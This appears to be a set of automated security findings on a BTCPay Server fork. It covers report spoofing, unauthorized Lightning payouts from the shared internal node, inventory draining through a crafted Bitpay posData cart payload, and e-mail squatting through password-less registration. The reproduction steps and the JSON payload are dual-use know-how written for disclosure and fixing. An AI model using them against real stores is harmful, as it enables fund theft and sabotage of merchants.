Inventory compensation is keyed to two event names (Expired, MarkedInvalid) and misses the FailedToConfirm transition (Processing -> Invalid) that the watcher emits for paid-but-unconfirmed invoices. Fix criteria: Every transition of an invoice out of the pending states without settlement (Expired, MarkedInvalid, FailedToConfirm) restores the reserved units exactly once, and an invoice later marked settled by the merchant after FailedToConfirm re-deducts them; a paid-unconfirmed invoice that is invalidated leaves inventory equal to its pre-order value.

---
**Severity:** MEDIUM
**Status:** Open
**Category:** Business logic error
**CWE:** [CWE-840](https://cwe.mitre.org/data/definitions/840.html)
**Attack vector:** NETWORK
**Attack complexity:** LOW
**Attack requirements:** PRESENT
**Privileges required:** NONE
**User interaction:** NONE
**Vulnerable system confidentiality impact:** NONE
**Vulnerable system integrity impact:** LOW
**Vulnerable system availability impact:** LOW
**Subsequent system confidentiality impact:** NONE
**Subsequent system integrity impact:** NONE
**Subsequent system availability impact:** NONE
**Repository:** Halbarevi/btcpayserver
**Branch:** main
**Commit:** 165bbbd3d1a2cfe1d463407b1fc172edb90c0586
**Date created:** 2026-10-18
**Finding URL:** https://claude.ai/security?project=scanproj_01T8kzaYNjL5FRBR7tZd6bAT&finding=scan_01PpWUp1JYcSoiTiFe8zzgGU-5257653

---

# Payment Requests report attributes invoices to payment requests by spoofable orderId alone

## Details
Payment requests collect their invoices through PaymentRequestRepository.GetInvoicesForPaymentRequest, which matches on both Metadata.OrderId == `PAY_REQUEST_<prId>` and the server-set internal tag `PAYREQ#<prId>` (set only by CreatePaymentRequestInvoice via CreateInvoiceCoreRaw's additionalTags), precisely because orderId is caller-controlled on several entry points. The Payment Requests report ('Requests' view on the store Reports page, its CSV export, and POST /api/v1/stores/{storeId}/reports) re-implements this join without the tag check: it queries the store's invoices by OrderId only and groups them by Metadata.OrderId.

A payment request id is a Guid embedded in the public, anonymous payment-request link that the merchant sends to the payer. An anonymous payer holding that link can create a PoS invoice on the same store with `orderId=PAY_REQUEST_<prId>` (UIPointOfSaleController.ViewPointOfSale: anonymous POST, antiforgery ignored, orderId persisted verbatim), or use the pay-button / legacy Bitpay endpoints on an AnyoneCanInvoice store. For any report window that contains both the PR's creation and the forged invoice:
1. If the forged invoice is never paid, `invoicesByOrderId` has an entry for the PR so the 'No Payment' row is skipped, and the loop over `GetPayments(true)` emits nothing: the genuine, still-unpaid payment request silently disappears from the report and its export.
2. If the attacker pays the forged invoice (any amount; PoS items may be arbitrarily small), its payments are listed as payments of the victim payment request, under the PR's title, reference and requested amount, and feed the 'Revenue by label and Payment Method' aggregates, so the report shows the request receiving money it never received (alongside any real payments).

The PoS orderId being payer-controlled is a documented integration caveat aimed at merchants matching their own backend order ids (UpdatePointOfSale.cshtml:341); this defect is different: BTCPay's own report trusts the field for an internal correlation that PaymentRequestRepository, PaymentRequestHub and TransactionLabelMarkerHostedService all deliberately protect with the PAYREQ# internal tag.

## Evidence
1. [BTCPayServer/Services/Reporting/PaymentRequestsReportProvider.cs:84–111](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Services/Reporting/PaymentRequestsReportProvider.cs#L84-L111)
   Derives PAY_REQUEST_<id> order ids for the store's payment requests, loads invoices with InvoiceQuery.OrderId = those ids (exact match in InvoiceRepository.GetInvoices:775-784) and groups them by Metadata.OrderId. No check of the server-set PAYREQ#<id> internal tag; this is the join the fix must change.
2. [BTCPayServer/Services/Reporting/PaymentRequestsReportProvider.cs:122–198](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Services/Reporting/PaymentRequestsReportProvider.cs#L122-L198)
   If any invoice carries the PR's order id the 'No Payment' row is skipped and one row per accounted payment of each such invoice is emitted under the PR's title/reference/amount. A forged unpaid invoice therefore removes the PR from the report; a forged paid invoice attributes the attacker's payments to it (and into the 'Revenue by label' chart totals).
3. [BTCPayServer/Services/PaymentRequests/PaymentRequestRepository.cs:227–238](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Services/PaymentRequests/PaymentRequestRepository.cs#L227-L238)
   The authoritative lookup used by PaymentRequestService and the PR view additionally filters on InternalTags containing PAYREQ#<id>, which only server code can set (CreateInvoiceCoreRaw additionalTags). The report omits this predicate.
4. [BTCPayServer/Controllers/UIInvoiceController.cs:140–158](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Controllers/UIInvoiceController.cs#L140-L158)
   Genuine PR invoices receive both Metadata.OrderId = PAY_REQUEST_<id> and the PAYREQ#<id> internal tag; the tag is the only attribute a payer cannot forge.
5. [BTCPayServer/Plugins/PointOfSale/Controllers/UIPointOfSaleController.cs:186–199](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Plugins/PointOfSale/Controllers/UIPointOfSaleController.cs#L186-L199)
   Anonymous PoS POST: [HttpPost("/apps/{appId}/pos/{viewType?}")], [IgnoreAntiforgeryToken], no [Authorize]; accepts a free-form `orderId` parameter.
6. [BTCPayServer/Plugins/PointOfSale/Controllers/UIPointOfSaleController.cs:405](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Plugins/PointOfSale/Controllers/UIPointOfSaleController.cs#L405)
   `OrderId = orderId ?? AppService.GetRandomOrderId()` stores the caller's orderId verbatim on an invoice of the app's own store (store = _appService.GetStore(app), line 64), the same store as the targeted payment request.
7. [BTCPayServer/Plugins/PayButton/Controllers/UIPublicPayButtonController.cs:66–76](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Plugins/PayButton/Controllers/UIPublicPayButtonController.cs#L66-L76)
   Alternative anonymous producer: the pay-button endpoint stores model.OrderId verbatim for stores that enabled AnyoneCanInvoice.
8. [BTCPayServer/Plugins/Bitpay/Controllers/BitpayInvoiceController.cs:139](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Plugins/Bitpay/Controllers/BitpayInvoiceController.cs#L139)
   Alternative anonymous producer: the legacy Bitpay create-invoice endpoint on an AnyoneCanInvoice store stores the caller's orderId.

## Impact
Merchant-facing accounting report, its CSV export and the Greenfield reports API return falsified attribution: payment requests can be hidden or shown as receiving foreign payments, and label/payment-method revenue totals are inflated. Payment request status, invoice state and funds are unaffected (the PR view and status updates use the tag-checked lookup). No confidentiality or availability impact.

## Reproduction steps
1. Attacker is a payer (or anyone the link was shared with) holding a payment-request URL of the target store, which reveals the Guid id. One anonymous PoS POST on that store with orderId=PAY_REQUEST_<id> suffices to hide the request from the report; paying the small forged invoice additionally injects payment rows. No privileges and no victim interaction beyond the merchant later reading the report or pulling it via the Greenfield reports API. Requires the store to expose a PoS app (or pay button / Bitpay with AnyoneCanInvoice) and the forged invoice to fall in the same report date window as the PR — AT:PRESENT.

## Recommended fix
PaymentRequestsReportProvider correlates invoices to payment requests by caller-controlled Metadata.OrderId instead of the server-set PAYREQ#<id> internal tag that PaymentRequestRepository.GetInvoicesForPaymentRequest requires. Fix criteria: The report attributes an invoice to a payment request only when the invoice carries the PAYREQ#<id> internal tag (or the same predicate as GetInvoicesForPaymentRequest / GetPaymentIdsFromInternalTags); an invoice created through PoS, pay button or Bitpay with a forged PAY_REQUEST_ orderId must neither suppress the request's 'No Payment' row nor appear under it.

---
**Severity:** MEDIUM
**Status:** Open
**Category:** Insufficient verification of data authenticity
**CWE:** [CWE-345](https://cwe.mitre.org/data/definitions/345.html)
**Attack vector:** NETWORK
**Attack complexity:** LOW
**Attack requirements:** PRESENT
**Privileges required:** NONE
**User interaction:** NONE
**Vulnerable system confidentiality impact:** NONE
**Vulnerable system integrity impact:** LOW
**Vulnerable system availability impact:** NONE
**Subsequent system confidentiality impact:** NONE
**Subsequent system integrity impact:** NONE
**Subsequent system availability impact:** NONE
**Repository:** Halbarevi/btcpayserver
**Branch:** main
**Commit:** 165bbbd3d1a2cfe1d463407b1fc172edb90c0586
**Date created:** 2026-10-18
**Finding URL:** https://claude.ai/security?project=scanproj_01T8kzaYNjL5FRBR7tZd6bAT&finding=scan_01PpWUp1JYcSoiTiFe8zzgGU-5257652

---

# Automated Lightning payout processor spends from the internal node on admin membership, not actor authority

## Details
BTCPay's policy, enforced on every interactive path, is that only a server admin may send funds from the server's shared internal Lightning node: UILightningLikePayoutController.ProcessLightningPayout (137-152) fails payouts with 'You are currently using the internal Lightning node for this payout's store but you are not a server admin' even for a user holding CanModifyStoreSettings, and the store-scoped Greenfield node API (GreenfieldLightningNodeApiController.Store.cs 165-174) refuses PayInvoice/OpenChannel/ConnectToNode on the internal node unless the caller IsInRole(ServerAdmin). Server-level policies such as CanUseInternalLightningNode succeed only for admins (BuiltInPermissionHandler.cs 67-69).

The background LightningAutomatedPayoutProcessor applies a different rule. In ProcessShouldSave (318-334) a store bound to the internal node is allowed to pay when StoreRepository.InternalNodePayoutAuthorized(storeId) (802-817) is true, and that SQL merely asks whether ANY member of the store is a ServerAdmin whose store role contains btcpay.store.canmodifystoresettings. It does not consider who created the processor, who created the pull payment, or who approved the payouts. The processor itself is configured by any user with the store-scoped CanModifyStoreSettings permission (UILightningAutomatedPayoutProcessorsController.Configure POST, 68-116; Greenfield PUT /api/v1/stores/{storeId}/payout-processors/LightningAutomatedPayoutSenderFactory/{payoutMethodId}, 72-104) with no admin requirement and no check that the store's node is internal; PayoutProcessorService starts it immediately on PayoutProcessorUpdated.

Attack: a non-admin user B who is Owner (or holds a custom role containing CanModifyStoreSettings) of a store S that (a) is bound to the internal node and (b) counts a server admin A among its settings-capable members — the ordinary case being an admin's own store shared with a co-owner, or a store whose Owner invitation an admin accepted — does the following without any action by A: enables the Lightning automated payout processor for BTC-LN (ProcessNewPayoutsInstantly makes payment immediate); creates a pull payment with AutoApproveClaims (CanCreatePullPayments is included in CanManagePullPayments, included in CanModifyStoreSettings, BTCPayServerServices.cs 579-592 and 662-676) and claims it to a BOLT11/LNURL destination B controls (claims against auto-approve pull payments go straight to AwaitingPayment, PullPaymentHostedService 736-756), or simply POSTs /api/v1/stores/{storeId}/payouts with Approved=true (GreenfieldPullPaymentController 481-490, 545-556 → PreApprove → AwaitingPayment). On the next processor tick InternalNodePayoutAuthorized is true because A is a member, the internal node client is built (327-329) and the server pays B's BOLT11 from the operator's node (HandlePayout → TrypayBolt → lightningClient.Pay, 232-237). The same user is refused by the manual payout page and the store node API. The admin took no spending action; their mere membership is used as the authority. Repeating this drains the internal node's outbound liquidity, which is shared by every store on the server, to the attacker.

Root cause: authorization for an admin-only privileged operation (spending from the shared internal node) is derived from a static property of the store's membership instead of from the privileges of the principal who configured the processor and created/approved the payouts (CWE-863).

## Evidence
1. [BTCPayServer/PayoutProcessors/Lightning/LightningAutomatedPayoutProcessor.cs:318–334](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/PayoutProcessors/Lightning/LightningAutomatedPayoutProcessor.cs#L318-L334)
   ProcessShouldSave is the only gate before the background processor pays AwaitingPayment payouts from the store's node. When the config IsInternalNode it consults StoreRepository.InternalNodePayoutAuthorized(storeId) and otherwise builds the internal client via CreateLightningClient and pays every payout (HandlePayout -> TrypayBolt -> lightningClient.Pay at 232-237). No check relates the payouts or the processor configuration to a server admin's action.
2. [BTCPayServer/Services/Stores/StoreRepository.cs:802–817](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Services/Stores/StoreRepository.cs#L802-L817)
   InternalNodePayoutAuthorized returns TRUE as soon as ANY member of the store is a SERVERADMIN whose store role contains btcpay.store.canmodifystoresettings. It is a property of the store's membership list, not of who configured the processor or who created/approved the payouts.
3. [BTCPayServer/PayoutProcessors/Lightning/UILightningAutomatedPayoutProcessorsController.cs:68–116](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/PayoutProcessors/Lightning/UILightningAutomatedPayoutProcessorsController.cs#L68-L116)
   The automated Lightning payout processor is created/enabled for a store by any cookie user holding CanModifyStoreSettings on that store (non-admin Owner). There is no admin requirement and no check that the store's Lightning node is internal; PayoutProcessorUpdated is published and the processor starts at once.
4. [BTCPayServer/Controllers/GreenField/GreenfieldStoreAutomatedLightningPayoutProcessorsController.cs:72–104](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Controllers/GreenField/GreenfieldStoreAutomatedLightningPayoutProcessorsController.cs#L72-L104)
   Same processor configuration over Greenfield under the store-scoped CanModifyStoreSettings permission; PayoutProcessorService starts the processor immediately on PayoutProcessorUpdated.
5. [BTCPayServer/Data/Payouts/LightningLike/UILightningLikePayoutController.cs:137–152](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Data/Payouts/LightningLike/UILightningLikePayoutController.cs#L137-L152)
   The manual payout path for the same store explicitly refuses a non-admin: 'You are currently using the internal Lightning node for this payout's store but you are not a server admin.' (requires CanModifyServerSettings on the acting user). This is the maintainers' stated policy that the automated path contradicts.
6. [BTCPayServer/Controllers/GreenField/GreenfieldLightningNodeApiController.Store.cs:165–173](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Controllers/GreenField/GreenfieldLightningNodeApiController.Store.cs#L165-L173)
   The store-scoped Greenfield node API likewise refuses PayInvoice/OpenChannel/ConnectToNode on the internal node unless the acting user IsInRole(ServerAdmin) (doingAdminThings). All interactive spend paths are actor-gated; only the automated processor is membership-gated.
7. [BTCPayServer/HostedServices/PullPaymentHostedService.cs:736–755](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/HostedServices/PullPaymentHostedService.cs#L736-L755)
   A claim against a pull payment created with AutoApproveClaims, or a claim carrying PreApprove, lands directly in AwaitingPayment, which is the state the automated processor pays.
8. [BTCPayServer/Controllers/GreenField/GreenfieldPullPaymentController.cs:481–490](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Controllers/GreenField/GreenfieldPullPaymentController.cs#L481-L490)
   POST /api/v1/stores/{storeId}/payouts with Approved=true needs only the store-scoped CanCreatePullPayments permission and passes PreApprove=true into the claim (545-556), so a non-admin Owner mints AwaitingPayment payouts to an arbitrary BOLT11 destination with no pull payment or admin involvement.
9. [BTCPayServer/Hosting/BTCPayServerServices.cs:579–592](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Hosting/BTCPayServerServices.cs#L579-L592)
   CanModifyStoreSettings includes CanManagePullPayments and CanManagePayouts; CanManagePullPayments includes CanCreatePullPayments (662-676). The non-admin Owner therefore holds every permission the attack needs from a single store role the admin granted.

## Impact
The operator's shared internal Lightning node is made to send funds chosen by a non-admin store member, an action every interactive path reserves for server admins; repeated payouts drain the node's outbound liquidity, which is shared by all stores on the server. No confidentiality impact; the loss is an unauthorized transfer of funds, counted under integrity.

## Reproduction steps
1. Attacker is an authenticated non-admin holding CanModifyStoreSettings (Owner or custom role) on a store bound to the internal node that also counts a server admin among its settings-capable members — an admin's own store shared with a co-owner, or a store whose Owner invitation an admin accepted. Over HTTP (UI or Greenfield) they enable the Lightning automated payout processor, create an auto-approve pull payment and claim it (or POST an Approved payout) to their own BOLT11/LNURL, and the background processor pays it from the internal node with no admin action. No defenses to defeat; the precondition is a state of the store's membership and Lightning config, hence AT:PRESENT.

## Recommended fix
1. InternalNodePayoutAuthorized authorizes internal-node spending from the presence of an admin in the store's membership rather than from the privileges of the actor who configured the processor or created/approved the payouts. Fix criteria: Automated payouts from the internal node must only be processed when the processor configuration (and ideally each payout's approval) was performed by a principal holding CanUseInternalLightningNode/ServerAdmin, e.g. by recording the configuring user at processor creation and re-validating when the store's node becomes internal or membership changes. A non-admin Owner of a store co-owned by an admin must be unable to cause the internal node to pay payouts they created.
2. Processor configuration endpoints (UI and Greenfield) accept enabling the Lightning automated payout processor for an internal-node store from any CanModifyStoreSettings holder. Fix criteria: Enabling or updating the Lightning automated payout processor for a store whose Lightning config IsInternalNode requires the acting user to pass the CanUseInternalLightningNode policy, consistent with UILightningLikePayoutController and the store node API; verify a non-admin Owner receives a permission error.

---
**Severity:** MEDIUM
**Status:** Open
**Category:** Incorrect authorization
**CWE:** [CWE-863](https://cwe.mitre.org/data/definitions/863.html)
**Attack vector:** NETWORK
**Attack complexity:** LOW
**Attack requirements:** PRESENT
**Privileges required:** LOW
**User interaction:** NONE
**Vulnerable system confidentiality impact:** NONE
**Vulnerable system integrity impact:** HIGH
**Vulnerable system availability impact:** NONE
**Subsequent system confidentiality impact:** NONE
**Subsequent system integrity impact:** NONE
**Subsequent system availability impact:** NONE
**Repository:** Halbarevi/btcpayserver
**Branch:** main
**Commit:** 165bbbd3d1a2cfe1d463407b1fc172edb90c0586
**Date created:** 2026-10-18
**Finding URL:** https://claude.ai/security?project=scanproj_01T8kzaYNjL5FRBR7tZd6bAT&finding=scan_01PpWUp1JYcSoiTiFe8zzgGU-5257651

---

# Anonymous Bitpay posData cart count drives arbitrary inventory decrement on tag-all crowdfund perks

## Details
AppInventoryUpdaterHostedService trusts the quantity stored in an invoice's posData cart. For the PoS and crowdfund order flows that is acceptable because those controllers validate the request against stock before creating the invoice (UIPointOfSaleController.cs:302-304; UICrowdfundController.cs:147-149, which also only ever deducts 1 via ItemCode). The same metadata key is writable, unvalidated, by the legacy Bitpay API: `POST /invoices?storeId=<id>` with `"posData": "{\"cart\":[{\"id\":\"<perkId>\",\"count\":1000000000,\"price\":0}]}"` is stored as Metadata.PosData through the PosDataLegacy setter (BitpayInvoiceController.cs:140, InvoiceEntity.cs:197-218). When the store has AnyoneCanInvoice enabled (the Pay Button setting), BitpayAuthorizationHandler grants CanCreateInvoice to an anonymous caller for that store.

If the store also runs a Crowdfund app with 'Count all invoices created on the store as part of the goal' (AppData.TagAllInvoices, set at UICrowdfundController.cs:545), UIInvoiceController.CreateInvoiceCoreRaw tags every store invoice with APP#<crowdfundId> (lines 280-283) and publishes InvoiceEvent.Created (295). The hosted service then parses the attacker's cart (TryParsePosCartItems accepts any positive int for any id, AppService.cs:495-523) and calls UpdateInventory(appId, [(perkId, -1000000000)]), which rewrites the perk's `inventory` in the PerksTemplate with no floor (AppService.cs:404-449, `inventory += change.Delta`). Perk ids and inventories are public (srvModel = Safe.Json(Model) on the crowdfund page). From then on ContributeToCrowdfund refuses the perk ('Option was out of stock') for every genuine contributor and the page shows 'Sold out'; the merchant has to notice and hand-edit the template.

The decrement is normally undone on InvoiceEvent.Expired (+count), but the Bitpay request also sets `expirationTime` with no upper bound (only < 0 and sooner-than-30-s are rejected), so an expiration years away means InvoiceWatcher never raises Expired and the burn is permanent; even without that, repeating the request every store-expiry period keeps the perk sold out. The attacker never pays: the invoice can be priced at the currency minimum (or created as a top-up) and remains unpaid. Several perks can be exhausted in one request (one cart line per perk). Counts up to int.MaxValue on a non-negative counter do not wrap; the result is simply a large negative inventory.

This is distinct from the recorded crowdfund-perk-inventory-check-then-act-race (TOCTOU on the crowdfund endpoint's own stock check, 1 unit per racing invoice) and pos-inventory-single-line-cart-underdecrement (ItemCode path deducting 1): here a different entry point (Bitpay/Greenfield posData) bypasses the only quantity checks entirely and allows an unbounded, unpaid, deterministic decrement.

Preconditions: the store has AnyoneCanInvoice enabled and a crowdfund app with UseAllStoreInvoices whose perks track inventory (non-default configuration, hence AT:P). A Greenfield API key holding only CanCreateInvoice for the store reaches the same sink through CreateInvoiceRequest.metadata.posData (UIInvoiceController.cs:171) without the AnyoneCanInvoice requirement, gaining control of app settings its permission scope does not grant.

## Evidence
1. [BTCPayServer/HostedServices/AppInventoryUpdaterHostedService.cs:40–67](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/HostedServices/AppInventoryUpdaterHostedService.cs#L40-L67)
   On InvoiceEvent.Created (deduct = -1) the service parses Metadata.PosData.cart via TryParsePosCartItems and applies InventoryChange(i.Id, i.Count * -1) to every app whose APP# internal tag is on the invoice (GetAppInternalTags). The count comes straight from the stored posData; nothing compares it to available stock, to the app's template, or to what was paid. This is the code the fix must change.
2. [BTCPayServer/Plugins/Bitpay/Controllers/BitpayInvoiceController.cs:139–140](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Plugins/Bitpay/Controllers/BitpayInvoiceController.cs#L139-L140)
   Legacy Bitpay POST /invoices copies the request's free-form posData string into Metadata.PosDataLegacy (line 140); the setter parses it as JSON and stores it as the posData JObject, so the caller fully controls posData.cart[].id/count.
3. [BTCPayServer/Plugins/Bitpay/Controllers/BitpayInvoiceController.cs:51–65](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Plugins/Bitpay/Controllers/BitpayInvoiceController.cs#L51-L65)
   CreateInvoice is reachable with BitpayAuthenticationTypes.Anonymous (BitpayAuthorizationHandler.cs:31-60 succeeds CanCreateInvoice for ?storeId= when the store blob has AnyoneCanInvoice), subject only to the PublicInvoices throttle keyed by a forwardable RemoteIpAddress; one request suffices.
4. [BTCPayServer/Services/Invoices/InvoiceEntity.cs:196–218](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Services/Invoices/InvoiceEntity.cs#L196-L218)
   PosDataLegacy setter: a JSON-object string becomes the typed posData JObject that TryParsePosCartItems consumes.
5. [BTCPayServer/Controllers/UIInvoiceController.cs:237–295](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Controllers/UIInvoiceController.cs#L237-L295)
   CreateInvoiceCoreRaw tags every invoice of the store with APP#<appId> for each app with TagAllInvoices (280-283) and publishes InvoiceEvent.Created (295), so a Bitpay/Greenfield invoice becomes an invoice of the crowdfund app and is processed by the inventory updater for it.
6. [BTCPayServer/Services/Invoices/InvoiceRepository.cs:206–211](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Services/Invoices/InvoiceRepository.cs#L206-L211)
   GetAppsTaggingStore selects the store's apps with TagAllInvoices.
7. [BTCPayServer/Services/Apps/AppService.cs:495–524](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Services/Apps/AppService.cs#L495-L524)
   TryParsePosCartItems accepts any positive int count for any id; no cross-check against the template or stock.
8. [BTCPayServer/Services/Apps/AppService.cs:404–449](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Services/Apps/AppService.cs#L404-L449)
   UpdateInventory resolves PerksTemplate for crowdfund apps and does inventory += delta for every matching item id with no floor, persisting an arbitrarily negative value under an xmin retry.
9. [BTCPayServer/Plugins/Crowdfund/Controllers/UICrowdfundController.cs:543–546](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Plugins/Crowdfund/Controllers/UICrowdfundController.cs#L543-L546)
   The crowdfund setting 'Count all invoices created on the store as part of the goal' (UseAllStoreInvoices) sets AppData.TagAllInvoices (545).
10. [BTCPayServer/Plugins/Crowdfund/Controllers/UICrowdfundController.cs:147–149](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Plugins/Crowdfund/Controllers/UICrowdfundController.cs#L147-L149)
   The shipped control on the crowdfund's own path: a perk with Inventory <= 0 is refused ('Option was out of stock'), so the poisoned counter blocks every genuine contributor, and the crowdfund flow itself only ever deducts 1 per invoice (ItemCode = ChoiceKey, line 219).
11. [BTCPayServer/Plugins/PointOfSale/Controllers/UIPointOfSaleController.cs:297–304](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Plugins/PointOfSale/Controllers/UIPointOfSaleController.cs#L297-L304)
   The PoS path validates each cart line's requested quantity against inventory before creating the invoice; the Bitpay/Greenfield path reaches the same updater with no such check.
12. [BTCPayServer/Plugins/Crowdfund/Views/Public/ViewCrowdfund.cshtml:329–331](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Plugins/Crowdfund/Views/Public/ViewCrowdfund.cshtml#L329-L331)
   Public page renders 'Sold out' for inventory <= 0; perk ids and inventories are exposed to anonymous visitors via srvModel = Safe.Json(Model) (line 355; Perks populated at CrowdfundPlugin.cs:209).
13. [BTCPayServer/Plugins/Bitpay/Models/BitpayCreateInvoiceRequest.cs:57–59](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Plugins/Bitpay/Models/BitpayCreateInvoiceRequest.cs#L57-L59)
   The caller chooses expirationTime (unix ms, DateTimeJsonConverter only rejects < 0; BitpayInvoiceController.cs:132 only rejects values sooner than +30 s). A far-future value means InvoiceWatcher never raises Expired, so the +count restore never runs. Greenfield Checkout.Expiration is likewise only lower-bounded (GreenfieldInvoiceController.cs:199).

## Impact
The merchant's app configuration (perk inventory counters in PerksTemplate) is overwritten with attacker-chosen negative values, and the affected perks become unpurchasable for all contributors until the merchant manually repairs the template; no confidentiality impact, no effect on funds or on server availability.

## Reproduction steps
1. Anonymous attacker reads perk ids from the public crowdfund page, then sends one JSON POST to the legacy Bitpay /invoices?storeId= endpoint of an AnyoneCanInvoice store with a posData cart carrying a huge count for each perk and a far-future expirationTime. No payment, no account, no user interaction; the only control is the PublicInvoices throttle keyed on a client-forwardable IP, and a single request suffices. Requires the target store to have AnyoneCanInvoice and a crowdfund with UseAllStoreInvoices and inventory-tracked perks (non-default configuration), hence AT:PRESENT. A CanCreateInvoice-only Greenfield key reaches the same sink without AnyoneCanInvoice.

## Recommended fix
1. AppInventoryUpdaterHostedService and AppService.UpdateInventory apply cart quantities from invoice metadata that was never validated by the PoS/crowdfund order flow (Bitpay/Greenfield-authored posData). Fix criteria: Inventory must only change for invoices whose cart was produced and validated by the app's own order flow (e.g. a server-set marker/tag, or re-validating each line against the template and available stock, capping the delta). A Bitpay or Greenfield invoice carrying posData.cart with arbitrary counts must leave inventory unchanged.
2. Tag-all apps attach foreign invoices (Bitpay, Pay Button, Greenfield) to the app, making their metadata drive app-side logic (inventory, stats). Fix criteria: Tag-all association should only feed the crowdfund goal/contribution totals, not inventory or item statistics; after the fix, a tag-all crowdfund's perk inventory is unaffected by invoices not created through its contribution endpoint.
3. Bitpay CreateInvoice accepts an unbounded expirationTime so the Expired-event compensation never runs. Fix criteria: Bound caller-supplied expiration to a sane maximum (or to the store's configured expiration) so every invoice eventually expires and compensating logic executes.

---
**Severity:** MEDIUM
**Status:** Open
**Category:** Improper input validation
**CWE:** [CWE-20](https://cwe.mitre.org/data/definitions/20.html)
**Attack vector:** NETWORK
**Attack complexity:** LOW
**Attack requirements:** PRESENT
**Privileges required:** NONE
**User interaction:** NONE
**Vulnerable system confidentiality impact:** NONE
**Vulnerable system integrity impact:** LOW
**Vulnerable system availability impact:** LOW
**Subsequent system confidentiality impact:** NONE
**Subsequent system integrity impact:** NONE
**Subsequent system availability impact:** NONE
**Repository:** Halbarevi/btcpayserver
**Branch:** main
**Commit:** 165bbbd3d1a2cfe1d463407b1fc172edb90c0586
**Date created:** 2026-10-18
**Finding URL:** https://claude.ai/security?project=scanproj_01T8kzaYNjL5FRBR7tZd6bAT&finding=scan_01PpWUp1JYcSoiTiFe8zzgGU-5257648

---

# Anonymous password-less API registration squats a victim's e-mail in an unclaimable account

## Details
The Greenfield endpoint POST /api/v1/users is anonymous and treats the password as optional. When request.Password is empty it calls UserManager.CreateAsync(user) without a password and persists an account whose PasswordHash is null, with Approved=false and RequiresEmailConfirmation copied from the server policy (GreenfieldUsersController.cs 322-397). The only required input is a syntactically valid e-mail address, which also becomes the UserName.

The API documentation (swagger.template.users.json:281) promises that 'if no password is set, an email will be sent to the user requiring him to set the password'. The code keeps that promise only for authenticated creators: UserEvent.Registered.Create (UserEvent.cs 33-44) produces an Invited event carrying an invitation link only when invitedBy is non-null. For an anonymous caller the creator is null, a plain Registered event is published, and UserEventHostedService (UserEventTriggerHostedService.cs 46-76) sends an e-mail for a plain Registered event only when RequiresEmailConfirmation is on and unconfirmed. With the default RequiresConfirmedEmail=false the mailbox owner receives nothing.

BTCPay's self-service recovery cannot repair such an account. ForgotPassword (UIAccountController.cs 661-679) runs UserService.CanLogin and only mints/sends a reset link when it passes; DefaultLoginExtension (UserService.cs 155-169) fails CanLogin for any user whose PasswordHash is null, so the request is silently swallowed with the generic 'check your email' page. /login rejects the account (CheckPasswordAsync is false for a null hash), /register rejects the address as already taken (DuplicateUserName), /invite/{userId}/{code} needs an invitation token that was never generated, and store invitations (/invitations/{token}) require a logged-in session and do not publish an Invited event for an existing user. Only a server administrator can fix the account (server/users/{id}/reset-password or the verification-email action).

